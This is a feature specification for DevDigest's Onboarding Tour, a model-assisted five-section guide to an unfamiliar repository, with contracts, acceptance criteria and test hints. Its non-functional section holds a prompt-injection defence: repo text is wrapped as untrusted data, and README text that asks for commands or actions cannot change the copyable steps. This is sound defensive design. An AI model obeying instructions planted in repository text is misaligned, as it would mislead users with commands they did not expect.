# Onboarding Tour — a five-section guide to an unfamiliar repository

**Status:** in-progress
**Lesson / ticket:** L05
**Packages:** server, client (reviewer-core, mcp-server and e2e unchanged)

## Goal
A developer who opens a repository they do not know has no single place that says how it is built, which files matter, how to run it and where to start. DevDigest already holds the facts in its repo index: rank, import graph, endpoints (S-5). The Onboarding Tour turns those facts into five sections: architecture overview, critical paths, how to run locally, a guided reading order and first tasks. The facts are collected without a model, and one structured model call writes the prose over them (S-1, S-4). The tour is built only when the user asks, stored per repository, and shown again without a new call. When the index or the model is unavailable, the page shows the model-free skeleton and says plainly why (S-1, S-2).

## Non-goals
- No MCP tool `get_onboarding_tour` (it is in S-4's MCP table). A later feature (S-2).
- No "Share link" button (design S-3). DevDigest is local-first with no auth (S-2).
- No automatic generation after indexing or on first visit (S-2).
- No new table, column or migration. Everything lives in the existing `onboarding` row (S-2, S-6).
- No git-history "hotness". The index stores `hotness = 0` (shallow clone), so rank is PageRank today (S-5, A-5).
- No stack or run-step detection for non-Node ecosystems (Python, Go, …). repo-intel indexes JS/TS only (S-5, A-8).
- No editing of the tour and no history of earlier tours. The latest one replaces the previous one (S-6).
- The first-run "add repository" wizard at `/onboarding` is a different screen and stays as it is (S-3 `screen_onboarding.jsx`, S-7).
- No "PR Leaderboard" nav item (shown in S-3's sidebar, unrelated).
- No cost shown on the page: `cost_usd` is stored, not displayed (P-3 rejected, S-9).
- Collapsed sections are not remembered; every load starts expanded (P-4 rejected, S-9).

## Sources
| ID | Source | What it contributes |
|---|---|---|
| S-1 | request — user text, 2026-10-07 (translated from Ukrainian) | Five sections; sidebar WORKSPACE → "Onboarding Tour"; sections collapsible, expanded by default; per-step copy icon on the right; `repoIntel` gathers stack, structure, routes and scripts without a model; reading path from the import graph, e.g. `PageRank × (1 + hotness)`; one structured LLM call; skeleton with an honest status when the index is degraded or the call fails; the index is in the DB |
| S-2 | request — user decisions, 2026-10-07 | Manual trigger only (empty state → Generate, then Regenerate; a stored tour is shown with no new call); storage in the existing `onboarding` table with status, SHA, model and cost inside the jsonb, no migration; server + client only, MCP out; "Open" opens the file on GitHub at the indexed SHA; "Share link" out |
| S-3 | design — Claude Design UI prototype https://claude.ai/artifact/949i8C4dnLUJnpsZFg4NHt, saved at `<scratchpad>/design/ui/`: `screen_tour_context.jsx:3-126` (N5), `chrome.jsx:4-8`, `app_shell.jsx:99` | Section kinds and titles; files + description; numbered steps with a copy icon; reading list with a "why"; three task cards with "Low/Medium complexity"; architecture diagram; collapsible cards open by default (`useState(true)`); "On this page" table of contents; header "Onboarding for <repo>", "Generated from index of N files · last refreshed …"; Regenerate; Share link; empty state with the text "Takes 30–60s and ~5,000 tokens"; nav position after Pull Requests, icon Boxes |
| S-4 | design — "DevDigest Field Manual" https://claude.ai/artifact/7WfoegJ395FEWoqsZ9KykV, saved at `<scratchpad>/design/engineering-review.txt` (lines ~98–170, 308, 521–525, 607, 635, 696) | The skeleton (reading path, stack, entry points) comes from rank and the graph with no model, and the model writes prose over it. The index degrades but never throws. Staleness is a real state, pinned to a SHA. Route `/repos/:id/tour`. Untrusted data is wrapped and `</untrusted>` escaped. Author text is capped at 4,000 chars. Only GitHub and the LLM provider are called |
| S-5 | existing — `server/src/modules/repo-intel/service.ts:189` (`getIndexState`), `:643` (`getTopFilesByRank`, junk filter `:713-737`), `:667` (`getCriticalPaths`: 5 top-ranked roots, greedy chain of `BFS_DEPTH` = 2 hops); `repository.ts:451-461` (ranked paths ordered by rank only, no tie-break); `server/src/db/schema/repo-intel.ts` (`file_rank.rank` = `pagerank` with `hotness` always 0, "would become `pagerank * (1 + hotness)`"; `file_facts.endpoints`; `repo_index_state`); `constants.ts:13,40` (JS/TS only, `MAX_INDEXED_FILES` 5000); repo-intel README § Degradation | The facts the skeleton is built from, the degradation states, the current ranking |
| S-6 | existing — `server/src/db/schema/context.ts:120-126` (`onboarding`: `repo_id` PK → repos ON DELETE CASCADE, `json` jsonb, `generated_at`); `contracts/knowledge.ts:28-47` (`Onboarding`, `OnboardingSection`, `OnboardingLink`, byte-identical in both vendored copies); `contracts/platform.ts:16,46-50` (feature model `onboarding`, default `openrouter` `deepseek/deepseek-v4-flash`); `server/src/prompts/onboarding.system.md` (an unused template with other section kinds: `architecture`, `routes_and_apis`); `contracts/brief.ts` `BlastDegradedReason` (L04) | Storage, contract and model selection already exist. No route serves `Onboarding` today (no `tour` or `onboarding` route in `server/src/modules/`) |
| S-7 | existing — `client/src/vendor/ui/nav.ts:22-27` (WORKSPACE: Pull Requests, Project Context); `client/src/components/app-shell/helpers.ts:29` (`/onboarding` → `onboarding-tour`, though `/onboarding` is the add-repository wizard); `client/messages/en/onboarding.json` (Generate/Regenerate wording; its body lists five *other* sections); `shell.json:20`; `client/src/lib/providers.tsx:32-41` (mutation errors toast); `client/messages/en/runs.json:80` ("Copied!"); `client/src/vendor/ui/primitives/Markdown.tsx` (no image override); `client/src/components/mermaid-diagram/MermaidDiagram.tsx:7-37` (invalid diagrams render nothing, `securityLevel: "strict"`); `e2e/specs/06-onboarding.flow.json` | UI pieces, wording and traps on the client side |
| S-8 | existing — `server/src/modules/conventions/service.ts:186-187` ("This repository has not been cloned yet."), `conventions/routes.ts:40-43` (one synchronous model call behind a pending button); `server/INSIGHTS.md` 2026-09-23 + 2026-10-02 (`timeoutMs` is per attempt; OpenRouter ignores it, 90 s × 3 attempts), 2026-10-06 (jsonb rejects `\u0000`); `reviewer-core/docs/llm-token-budget.md`; `docs/shared-contracts.md` § Cost fields | LLM-call patterns, wording and traps |
| S-9 | request — user decisions, resolution round 1, 2026-10-07 | Copyable run steps come only from manifests, lockfiles, `.env.example` and compose; README-only commands may appear in prose only. A failed or timed-out Regenerate keeps the stored model-written tour and returns 502. P-1 (confirm before Regenerate) and P-2 (elapsed seconds) accepted; P-3, P-4 rejected |

## User stories
### US-1 — Generate a tour on demand (P1)
As a developer new to a repository, I want to press one button and get a five-section tour, so that I can orient myself without reading the whole codebase.
**Independent test:** on an indexed repo with no tour, open Onboarding Tour and press Generate. The page shows five sections. A reload shows the same tour and makes no model call.

### US-2 — Read and navigate the tour (P1)
As that developer, I want collapsible sections, a table of contents and links to the exact files on GitHub, so that I can read it in my own order.
**Independent test:** collapse and expand a section by keyboard. Jump to "First tasks" from "On this page". Open a reading-path file and land on `github.com/<repo>/blob/<indexed_sha>/<path>`.

### US-3 — Copy run commands (P2)
As that developer, I want to copy each "How to run locally" command with one click, so that I can paste it into a terminal.
**Independent test:** click a step's copy icon. The clipboard holds exactly that command, and the icon confirms "Copied!".

### US-4 — See an honest status when something is missing (P1)
As that developer, I want the page to say when the tour is only a skeleton, when the index is partial and why, so that I know how far to trust it.
**Independent test:** with no API key, Generate. The page shows the skeleton sections and the "no API key" notice.

### US-5 — Know when the tour is out of date (P2)
As that developer, I want to see when the repository has been re-indexed since the tour was written, so that I regenerate before I trust old paths.
**Independent test:** generate, re-index to a new SHA, reload. The stale banner names both SHAs, and the Open links still use the tour's SHA.

## Contract
- **Routes** (scoped to the workspace; a non-uuid `:id` → 422; unknown or other-workspace repo → 404 `Repository not found`):
  - `GET /repos/:id/tour` → 200 `OnboardingTourState`. Reads the stored row and the current index state. Never calls a model.
  - `POST /repos/:id/tour/generate` (no body) → 200 `OnboardingTourState` holding the newly stored tour. 409 `An onboarding tour is already being generated for this repository.` while one runs for the repo. 422 `This repository has not been cloned yet.` (S-8). Synchronous: the response arrives when the tour is stored (S-8 pattern).
- **Shared contracts** — `contracts/knowledge.ts` in **both** vendored copies (`server/src/vendor/shared`, `client/src/vendor/shared`), additive only. Existing fields keep their meaning (S-6):
  ```ts
  OnboardingSectionKind = z.enum(['architecture_overview','critical_paths','how_to_run','guided_reading','first_tasks'])
  OnboardingLink    += { note: z.string().nullish() }          // plain text: what the file does / why read it
  OnboardingStep    =  z.object({ command: z.string(), note: z.string().nullish() })
  OnboardingTask    =  z.object({ title: z.string(), scope: z.string(), difficulty: z.enum(['low','medium']) })
  OnboardingSection += { steps: z.array(OnboardingStep).optional(), tasks: z.array(OnboardingTask).optional() }
  Onboarding        += { source: z.enum(['llm','skeleton']), skeleton_reason: z.enum(['index_unavailable','llm_unavailable','llm_failed','llm_timeout']).optional(),
                         index_status: z.enum(['full','partial','degraded','failed','none']), index_reason: BlastDegradedReason.optional(),
                         indexed_sha: z.string(), files_indexed: z.number().int(), generated_at: z.string(),
                         model: z.string().nullish(), cost_usd: z.number().nullish() }   // optional in Zod; the server always sets them
  OnboardingTourState = z.object({ tour: Onboarding.nullable(), generating: z.boolean(), stale: z.boolean(), current_indexed_sha: z.string().nullable() })
  ```
  `kind` stays `z.string()` and carries only `OnboardingSectionKind` values. `cost_usd: null` means unknown, never 0 (S-8).
- **Section content.** "Skeleton" is what exists with no model. "Model" is what the one call adds. The model never adds, removes or reorders a file, step or path (S-4):

  | Section (title, S-3) | Skeleton | Model adds |
  |---|---|---|
  | `architecture_overview` "Architecture overview" | body: Stack (A-8), Structure (top-level directories with indexed-file counts), HTTP endpoints (count plus up to 10, A-30); a diagram of imports between top-level directories (A-10) | a markdown overview paragraph above the facts |
  | `critical_paths` "Critical paths" | links: the files of the existing critical-path chains, deduplicated in chain order (A-6), note "Imported by N files" (A-26) | one-line note per file |
  | `how_to_run` "How to run locally" | steps built from manifests (A-7) — only these are copyable; a command found only in the README may appear in the model's prose, never as a step (S-9, user · 2026-10-07) | one-line note per step |
  | `guided_reading` "Guided reading path" | links: the reading path (AC-11), note "Imported by N files" | the "why" note per file |
  | `first_tasks` "First tasks" | none | up to 3 tasks (A-12) |
- **MCP tools:** none.
- **UI surface:** sidebar WORKSPACE item "Onboarding Tour" (icon Boxes, S-3) → page `/repos/:repoId/tour` (A-1). The page has a header, status notices, an "On this page" list and five collapsible section cards. No Share link.
- **Persistence:** one `onboarding` row per repo, replaced on every stored generation. The whole `Onboarding` document goes in `json`, and `generated_at` is set to that time. No schema change, no migration (S-2).

### Module interaction
```mermaid
sequenceDiagram
  participant C as client (Tour page)
  participant S as server (tour routes)
  participant R as repoIntel facade + index (Postgres)
  participant G as clone (manifests, README)
  participant L as LLM provider (feature model "onboarding")
  C->>S: POST /repos/:id/tour/generate
  S->>R: index state, ranked files, edges, endpoints, critical paths
  Note over S,R: no data / failed / degraded / flag off → skeleton, no model call (AC-14)
  S->>G: read manifests + README excerpt (A-7, A-9, A-11)
  S->>L: one structured call, facts as untrusted data
  Note over S,L: no key / error / timeout → skeleton + reason (AC-15..17)
  S->>S: drop ungrounded output, merge onto skeleton, upsert onboarding row
  S-->>C: 200 OnboardingTourState
  C->>S: GET /repos/:id/tour (later visits; no model call)
```

## Acceptance criteria
- **AC-1** (US-2 · S-1) The sidebar SHALL show "Onboarding Tour" in WORKSPACE directly after "Pull Requests", linking to `/repos/<activeRepoId>/tour` (S-3, A-1).
- **AC-2** (US-2 · S-7) WHILE the path is `/repos/<id>/tour`, the sidebar SHALL mark "Onboarding Tour" as the active item.
- **AC-3** (US-2 · S-7) WHILE the path is `/onboarding` (add repository), the sidebar SHALL NOT mark "Onboarding Tour" as active.
- **AC-4** (US-1 · S-2) WHEN `GET /repos/:id/tour` is called, the server SHALL return 200 `OnboardingTourState` from the stored row and make no model call.
- **AC-5** (US-1 · S-2) IF `:id` is an unknown or other-workspace repo, THEN both tour routes SHALL return 404 `Repository not found`.
- **AC-6** (US-1 · S-3) WHILE `tour` is null and `generating` is false, the page SHALL show the title "Generate onboarding tour", the body of NFR-11 and a "Generate onboarding tour" button.
- **AC-7** (US-1 · S-2) WHEN the user activates Generate, or Regenerate while no model-written tour is stored, or confirms the AC-49 dialog, the client SHALL send exactly one `POST /repos/:id/tour/generate`.
- **AC-8** (US-1 · S-1) WHILE the index status is `full` or `partial`, WHEN generate runs and the model answers valid output in time, the server SHALL return 200 with `source: "llm"`, `model` and `cost_usd` set, and the same tour on the next GET (A-3).
- **AC-9** (US-1 · S-3) The server SHALL emit exactly five sections, in the order and with the titles of § Contract › Section content.
- **AC-10** (US-1 · S-4) WHEN a tour is stored, the files, steps and their order in every section SHALL equal the skeleton built from the same index and clone, whatever the model returned.
- **AC-11** (US-2 · S-1) The reading path SHALL list up to 10 indexed files without tests, configs, migrations or declaration files, ordered by stored `file_rank.rank` (`pagerank × (1 + hotness)`) descending, ties by path ascending (A-4, A-5).
- **AC-12** (US-1 · S-4) IF the model's answer names a path that is not in the skeleton, or a task scope that fails A-12, THEN the server SHALL drop that item and keep the skeleton note.
- **AC-13** (US-4 · S-4) WHILE `source` is `skeleton`, the First tasks section SHALL show "First tasks are written by the model. Regenerate once the model is available." and no task cards.
- **AC-14** (US-4 · S-1) IF the index state is no row, `failed`, `degraded`, or repo-intel is off, THEN generate SHALL make no model call and store `source: "skeleton"`, `skeleton_reason: "index_unavailable"` and `index_reason` (A-3).
- **AC-15** (US-4 · S-1) WHILE no model-written tour is stored, IF no API key is set for the `onboarding` feature model's provider, THEN generate SHALL store `source: "skeleton"`, `skeleton_reason: "llm_unavailable"` and return 200 (A-33).
- **AC-16** (US-4 · S-1) WHILE no tour or a skeleton tour is stored, IF the model call errors or its answer fails the schema, THEN generate SHALL store `source: "skeleton"`, `skeleton_reason: "llm_failed"` and return 200.
- **AC-17** (US-4 · S-9) WHILE a model-written tour is stored, IF the model call of Regenerate fails, times out or cannot be made for want of an API key, THEN the server SHALL return 502 `The model call failed — your previous tour is unchanged.` (A-33).
- **AC-18** (US-4 · A-13) WHILE no model-written tour is stored, IF the model has not answered within NFR-1's limit, THEN generate SHALL store `source: "skeleton"`, `skeleton_reason: "llm_timeout"` and return 200.
- **AC-19** (US-1 · S-8) IF the repository has no clone, THEN generate SHALL return 422 `This repository has not been cloned yet.` and write no row.
- **AC-20** (US-1 · A-15) WHILE a generation for a repo is running, WHEN another generate request arrives for that repo, the server SHALL return 409 with the § Contract message and make no model call.
- **AC-21** (US-1 · S-3) WHILE the generate request is pending, the page SHALL disable Generate/Regenerate, label it "Generating…" or "Regenerating…" and show "This usually takes 30–60 s."
- **AC-22** (US-1 · A-16) WHILE GET returns `generating: true`, the page SHALL show the pending state of AC-21 and refetch every 5 s until it is false.
- **AC-23** (US-1 · S-7) IF generate returns an error, THEN the client SHALL show the error message as a toast and keep showing the previous page state.
- **AC-24** (US-1 · S-8) IF repo-derived or model text contains `\u0000`, THEN the server SHALL store it without that character and return 200 (A-22).
- **AC-25** (US-4 · A-21) IF the stored `json` does not parse as `Onboarding`, THEN GET SHALL return `tour: null` and log a warning naming the repo.
- **AC-26** (US-2 · S-3) WHILE a tour is shown, the header SHALL read "Onboarding for <repo name>" and "Generated from index of <files_indexed> files · last refreshed <generated_at, local time>", plus "· <model>" when `source` is `llm` (A-23).
- **AC-27** (US-2 · S-1) WHEN the page renders a tour, all five sections SHALL be expanded (A-17).
- **AC-28** (US-2 · S-1) WHEN the user activates a section header by click, Enter or Space, the page SHALL toggle that section's content and its `aria-expanded`.
- **AC-29** (US-2 · S-3) WHEN the user activates an "On this page" entry, the page SHALL scroll that section into view and expand it if collapsed (A-18).
- **AC-30** (US-2 · S-2) Each file in Critical paths and Guided reading path SHALL have an "Open" link to `https://github.com/<full_name>/blob/<tour.indexed_sha>/<path>` that opens in a new tab (A-20).
- **AC-31** (US-2 · A-10) IF the architecture diagram cannot be rendered, THEN the section SHALL show its text without a diagram and without an error graphic.
- **AC-32** (US-2 · S-2) The page SHALL NOT render a "Share link" control.
- **AC-33** (US-2 · S-3) Each task card SHALL show its title, scope path and the text "Low complexity" or "Medium complexity".
- **AC-34** (US-3 · S-1) WHEN the user activates the copy icon at the right of a step, the client SHALL write exactly that step's `command` (no note) to the clipboard.
- **AC-35** (US-3 · S-7) WHEN the copy succeeds, the icon SHALL show "Copied!" for 2 s (A-19).
- **AC-36** (US-3 · A-19) IF the clipboard is unavailable or the write rejects, THEN the page SHALL show "Couldn’t copy — select the command and copy it by hand."
- **AC-37** (US-4 · S-1) WHILE `source` is `skeleton`, the page SHALL show the NFR-11 notice for `skeleton_reason` (and `index_reason`) with a Regenerate button.
- **AC-38** (US-4 · S-5) WHILE `index_status` is `partial`, the page SHALL show the NFR-11 partial-index notice.
- **AC-39** (US-5 · S-4) WHEN GET is called and the current `last_indexed_sha` differs from `tour.indexed_sha`, the server SHALL return `stale: true` and `current_indexed_sha`.
- **AC-40** (US-5 · S-4) WHILE `stale` is true, the page SHALL show the NFR-11 stale banner with both SHAs in short form (A-32) and keep the tour's SHA in Open links.
- **AC-41** (US-4 · A-27) WHILE a section other than First tasks has no items, it SHALL show "The index has nothing for this section."
- **AC-42** (US-1 · A-28) WHILE GET is in flight with no cached data, the page SHALL show "Loading onboarding tour…".
- **AC-43** (US-1 · S-7) IF GET fails with a network or 5xx error, THEN the page SHALL show "Couldn’t load the onboarding tour" and a Retry button that refetches.
- **AC-48** (US-4 · S-9) WHEN the server answers AC-17's 502, the stored `onboarding` row SHALL be unchanged, `generated_at` included.
- **AC-49** (US-1 · S-9) WHILE the stored tour has `source: "llm"`, WHEN the user activates Regenerate, the page SHALL open a dialog titled "Replace this onboarding tour?" with the text "Regenerating makes one model call on your API key and replaces the current tour. Takes 30–60s and ~5,000 tokens." and the buttons "Regenerate" and "Cancel" (P-1 · user).
- **AC-50** (US-1 · S-9) WHEN the user activates "Cancel" or presses Escape in the AC-49 dialog, the page SHALL close it, send no request and return focus to the Regenerate button (P-1 · user).
- **AC-51** (US-1 · S-9) WHILE a generate request sent from this page is pending, the page SHALL show "{seconds} s elapsed" next to the button, counted from the click and updated once per second (P-2 · user).
- **AC-52** (US-1 · A-34) WHILE `generating` is true but no request from this page is pending, the page SHALL show the AC-21 hint without an elapsed counter (P-2 · user).

### Must keep working
- **AC-44** (existing · `server/src/db/schema/context.ts:120-126`) WHEN a repository is removed, the server SHALL CONTINUE TO delete its `onboarding` row.
- **AC-45** (existing · `e2e/specs/06-onboarding.flow.json`) WHEN `/onboarding` loads, the client SHALL CONTINUE TO render "Add a repository" and "Repository URL".
- **AC-46** (existing · `server/src/vendor/shared/contracts/platform.ts:46-50`, `server/src/modules/settings/feature-models.ts`) WHEN the workspace picks a model for "Onboarding Tour" in Feature Models, the server SHALL CONTINUE TO use it (the generate call included).
- **AC-47** (existing · `server/src/db/migrations/`, `server/src/db/schema/`) The change SHALL CONTINUE TO leave every migration and schema file untouched (S-2).

## States and edge cases
| Surface | Default | Loading | Empty | Error | Partial / degraded | No access | Stale / expired |
|---|---|---|---|---|---|---|---|
| Tour page | AC-26, AC-9 | AC-42; generating AC-21, AC-22, AC-51, AC-52 | AC-6 | AC-43; generate AC-23, AC-19, AC-20; confirm AC-49, AC-50 | AC-37, AC-38, AC-13 | AC-5 (404) → A-31 | AC-40; unreadable row AC-25 |
| Section card | AC-27 | n/a (data arrives with the page) | AC-41 | diagram AC-31 | AC-13 | n/a | AC-40 |
| How-to-run copy | AC-34, AC-35 | n/a | AC-41 | AC-36 | n/a | n/a | n/a |
| Generate (server) | AC-8 | n/a | no-index AC-14 | AC-15, AC-16, AC-17, AC-48, AC-18 | partial index AC-8, A-3 | AC-5, AC-19 | regenerate after re-index AC-8 |
| Sidebar item | AC-1, AC-2 | n/a | no active repo → existing href fallback (S-7) | n/a | n/a | n/a | wrong active key AC-3 |

Other edge cases: double click / two tabs → AC-7, AC-20. Refresh mid-generation → AC-22. Server restart mid-generation → the guard is lost and nothing is stored (A-15). Repo deleted mid-generation → the upsert fails on the foreign key and nothing is stored (AC-44). Index re-runs mid-generation → the tour records the SHA read at the start (A-9). NUL bytes → AC-24. Directory names with shell metacharacters → A-7. Very large repo → `repo_too_large` → AC-14.

## Non-functional
- **NFR-1** (time budget · A-13) WHEN generate calls the model, the server SHALL respond within 120 s wall-clock, all attempts included. Past that it answers per AC-18, or AC-17 while a model-written tour is stored.
- **NFR-2** (time budget · A-29) WHEN generate makes no model call, the server SHALL respond within 10 s on a repo indexed at `MAX_INDEXED_FILES` (5,000 files).
- **NFR-3** (LLM calls · S-1) WHEN generate runs, the server SHALL make at most 1 structured call with the `onboarding` feature model, at most 2 attempts, capped at 6,000 output tokens including reasoning (A-14). GET makes 0 calls.
- **NFR-4** (LLM cost · S-8) The stored tour SHALL carry the provider-reported `cost_usd`, or `null` when unknown, never 0 for unknown. It is paid from the user's own provider key.
- **NFR-5** (privacy · S-4) WHEN generate calls the model, the request SHALL hold only: repo full name, stack facts, top-level structure, skeleton paths, endpoints (method + path), skeleton commands and up to 4,000 chars of the root README (A-11). It SHALL hold no other file content, no `.env*` content and no script bodies.
- **NFR-6** (untrusted input · S-4) WHEN repo-derived text enters the prompt, the server SHALL place it inside `<untrusted>` delimiters with any literal `</untrusted>` escaped, under a system prompt that treats it as data.
- **NFR-7** (untrusted input · S-7) WHEN model text renders on the page, the client SHALL render no raw HTML element, load no remote image and produce no `javascript:` link. Notes render as plain text (A-2).
- **NFR-8** (untrusted input · S-4) IF the README or any repo text asks for a command, a URL or an action, THEN the stored copyable steps SHALL still equal the manifest-derived skeleton steps (AC-10).
- **NFR-9** (accessibility · S-1) Section headers SHALL be buttons with `aria-expanded` and `aria-controls`. Each copy button SHALL have the accessible name "Copy command: <command>". Status notices SHALL use `role="status"`. Difficulty SHALL be text, not colour only. The AC-51 counter SHALL NOT be in a live region, so it is not announced every second (P-2 · user).
- **NFR-10** (observability · A-24) WHEN generate finishes, the server SHALL write one log line `onboarding: generated` with `repoId, source, skeleton_reason, index_status, indexedSha, droppedItems, model, costUsd, ms` and `correlationId`.
- **NFR-11** (wording · S-3, S-7, A-25) The page SHALL use exactly, in English: empty body "DevDigest indexes the repo and writes a guided tour: architecture, critical paths, how to run, a reading order, and first tasks. Takes 30–60s and ~5,000 tokens." · `index_unavailable` "Skeleton only — the repository index is unavailable ({reason}). Re-index the repository, then Regenerate." with reason `flag_off` "repo intelligence is turned off", `no_data` "the repository is not indexed yet", `index_failed` "indexing failed", `repo_too_large` "the repository is too large to index" · `llm_unavailable` "Skeleton only — no API key is set for the onboarding model. Add one in Settings → API Keys, then Regenerate." · `llm_failed` "Skeleton only — the model call failed. Regenerate to try again." · `llm_timeout` "Skeleton only — the model did not answer within 120 s. Regenerate to try again." · partial "The index is partial — some files were skipped, so this tour may miss parts of the repository." · stale "Out of date — the index moved from {tourSha} to {currentSha} after this tour was generated. Regenerate to update it."

## Assumptions
- **A-1** The page lives at `/repos/:repoId/tour` and the API under `/repos/:id/tour`, because S-4's route table names `/repos/:id/tour`.
- **A-2** Model notes (per file, per step) are plain text; only section bodies are markdown — the smaller rendering surface for model output (NFR-7).
- **A-3** A `partial` index still gets the model call, and the tour is marked partial. `failed`, `degraded`, no row and flag off get the skeleton with no call. Reason: L04 treats `partial` as data plus a flag (S-5). S-1's "degraded" is read as no usable data.
- **A-4** The reading path holds up to 10 files and reuses the existing junk-path filter. Ties sort by path ascending, because today's ranked query has no tie-break (S-5) and the tour must be deterministic.
- **A-5** Order uses the stored `file_rank.rank`, defined as `pagerank × (1 + hotness)`. `hotness` is 0 today, so the order is PageRank (S-5).
- **A-6** Critical paths reuse the existing chain method (5 roots, 2 hops). Files are deduplicated in first-seen order (S-5).
- **A-7** Run steps, per directory holding a `package.json` (repo root, then top-level directories alphabetically): install by lockfile (`pnpm-lock.yaml` → `pnpm install`, `package-lock.json` → `npm ci`, `yarn.lock` → `yarn install`, none → `npm install`). Then `cp .env.example .env` if that file exists, then `<pm> run dev`, `<pm> run start`, `<pm> run test` for the scripts that exist. Then `docker compose up -d` once if a compose file is at the root. A sub-directory's commands are prefixed `cd <dir> && `. A directory whose name is not `[A-Za-z0-9._-]+` is skipped. At most 20 steps. Fixed script names keep repo text out of the commands.
- **A-8** Stack = the package managers found plus up to 15 runtime dependency names per manifest (alphabetical), plus "Docker" when a Dockerfile or compose file exists. Node manifests only, because repo-intel indexes JS/TS only (S-5).
- **A-9** Index facts come from the index state read at the start, and `indexed_sha` records that state's SHA. Manifests and the README come from the clone as checked out, which may be ahead of the index (server INSIGHTS 2026-10-02).
- **A-10** The diagram is built without a model: top-level directories (or the directories under a single root such as `src/`), at most 12 nodes, an edge wherever an import crosses them. The model writes no diagram.
- **A-11** The README excerpt is the first 4,000 chars of the root `README.md`, matching S-4's cap on author text. `.env*` values and script bodies are never sent.
- **A-12** At most 3 tasks (S-3 shows 3). Difficulty is `low` or `medium` (S-3). A task's scope must be an indexed file, or a path whose parent directory holds an indexed file.
- **A-13** 120 s wall-clock is the limit for the whole call. S-3 says 30–60 s is typical, and S-4's MCP run budget is 118 s. OpenRouter ignores the per-attempt timeout (S-8), so the limit is on the call as the user waits for it.
- **A-14** 6,000 output tokens including reasoning and at most 2 attempts. Intent uses 3,000 and conventions 4,000 (S-8), and five sections need more.
- **A-15** The in-progress guard is per repository and lives in the server process, so it is lost on restart (local-first, single process).
- **A-16** A 5 s refetch interval while `generating` is true.
- **A-17** Collapsed state is not kept across reloads. Every load starts expanded (S-1).
- **A-18** "On this page" expands a collapsed target, because a jump to a closed card shows nothing.
- **A-19** "Copied!" shows for 2 s. The copy-failure text is new wording.
- **A-20** Open links exist only for indexed files, because a task scope may be a file that does not exist yet.
- **A-21** A stored row that no longer parses counts as no tour, and the next Generate replaces it.
- **A-22** NUL is stripped rather than failing the save, because the tour is regenerable and Postgres jsonb rejects NUL (S-8).
- **A-23** The header shows the model name when `source` is `llm`. Cost is stored but not shown (S-3 shows neither).
- **A-24** One log line per generate, the same shape as L04's `blast: computed`.
- **A-25** Tour and UI text are English only: only `messages/en` exists (S-7), and the unused template's language placeholder is not exposed.
- **A-26** The skeleton note "Imported by N files" counts the files with an import edge to that file.
- **A-27** One empty-section text for all sections except First tasks.
- **A-28** The loading text is new wording.
- **A-29** 10 s for the no-model path. It is only SQL and a few small file reads.
- **A-30** Up to 10 endpoints, from the highest-ranked files first.
- **A-31** A 404 on GET shows "Repository not found" in place of the page.
- **A-32** SHAs show as their first 7 characters, git's short form.
- **A-33** A missing API key during Regenerate over a model-written tour counts as a failed call (AC-17), because it would cost the same good prose the user chose to keep (S-9).
- **A-34** After a reload mid-generation the page shows no counter, because the server does not report when the generation started.

## Open questions
none

## Proposals
- **P-1** Ask for confirmation before Regenerate replaces an LLM-written tour. Reason: it is a paid action that overwrites (error prevention) — accepted (user · 2026-10-07) → AC-49, AC-50.
- **P-2** Show elapsed seconds next to "Generating…". Reason: visibility of system status on a 30–60 s wait — accepted (user · 2026-10-07) → AC-51, AC-52.
- **P-3** Show `cost_usd` in the header next to the model. Reason: consistent with the run cost shown on PR pages — rejected (user · 2026-10-07) — see § Non-goals.
- **P-4** Remember collapsed sections per repo across reloads. Reason: user control — rejected (user · 2026-10-07) — see § Non-goals.

## Traceability and verification
| ID | Story | Source | Method | Suite | Verification hint |
|---|---|---|---|---|---|
| AC-1 | US-2 | S-1 | test | client | WORKSPACE links in order Pull Requests, Onboarding Tour, Project Context; href `/repos/<id>/tour` |
| AC-2 | US-2 | S-7 | test | client | active key for `/repos/x/tour` is the tour item |
| AC-3 | US-2 | S-7 | test | client | active key for `/onboarding` is not the tour item |
| AC-4 | US-1 | S-2 | test | server-integration | seeded row → 200 body with `tour.sections.length` 5; stub LLM records 0 calls |
| AC-5 | US-1 | S-2 | test | server-integration | other-workspace repo id → 404 on GET and POST; `abc` → 422 |
| AC-6 | US-1 | S-3 | test | client | `tour: null` renders the title, body and the button |
| AC-7 | US-1 | S-2 | test | client | two rapid clicks on Generate → mocked POST called once |
| AC-8 | US-1 | S-1 | test | server-integration | stub LLM fixture → 200 `source: "llm"`, `model` set; following GET equal |
| AC-9 | US-1 | S-3 | test | server-unit | kinds and titles in the § Contract order |
| AC-10 | US-1 | S-4 | test | server-unit | a model answer that reorders and adds files leaves the skeleton list unchanged |
| AC-11 | US-2 | S-1 | test | server-unit | equal-rank `b.ts`, `a.ts` → `a.ts` first; `x.test.ts` absent; 12 candidates → 10 |
| AC-12 | US-1 | S-4 | test | server-unit | note for `ghost.ts` dropped; task scope `nowhere/x.ts` dropped |
| AC-13 | US-4 | S-4 | test | client | skeleton tour renders the First tasks sentence and no task card |
| AC-14 | US-4 | S-1 | test | server-integration | no `repo_index_state` row → `skeleton_reason: "index_unavailable"`, `index_reason: "no_data"`, 0 LLM calls |
| AC-15 | US-4 | S-1 | test | server-integration | provider without key → `llm_unavailable`, 200 |
| AC-16 | US-4 | S-1 | test | server-integration | stub LLM throws → `llm_failed`, row stored |
| AC-17 | US-4 | S-9 | test | server-integration | stored `source: "llm"` row + stub LLM throws → 502 with the message |
| AC-18 | US-4 | A-13 | test | server-unit | stub LLM that never resolves under fake timers → `llm_timeout` |
| AC-19 | US-1 | S-8 | test | server-integration | repo with `clone_path` null → 422 message, no `onboarding` row |
| AC-20 | US-1 | A-15 | test | server-integration | second POST while a gated stub LLM call is open → 409; stub records 1 call |
| AC-21 | US-1 | S-3 | test | client | pending mutation → disabled button "Generating…" and the hint |
| AC-22 | US-1 | A-16 | test | client | `generating: true` → pending state; refetch interval 5,000 ms |
| AC-23 | US-1 | S-7 | test | client | mocked 409 → toast with its message; previous tour still rendered |
| AC-24 | US-1 | S-8 | test | server-integration | README excerpt and stub output with `a\u0000b` → 200, stored text `ab` |
| AC-25 | US-4 | A-21 | test | server-integration | seeded `json: {"x":1}` → `tour: null`, warning line |
| AC-26 | US-2 | S-3 | test | client | header strings with file count, time and model |
| AC-27 | US-2 | S-1 | test | client | five section bodies visible on first render |
| AC-28 | US-2 | S-1 | test | client | Enter on a header hides the body; `aria-expanded` false |
| AC-29 | US-2 | S-3 | test | client | activating "First tasks" in the list expands that collapsed section |
| AC-30 | US-2 | S-2 | test | client | Open `href` equals the GitHub blob URL with the tour SHA; `target="_blank"` |
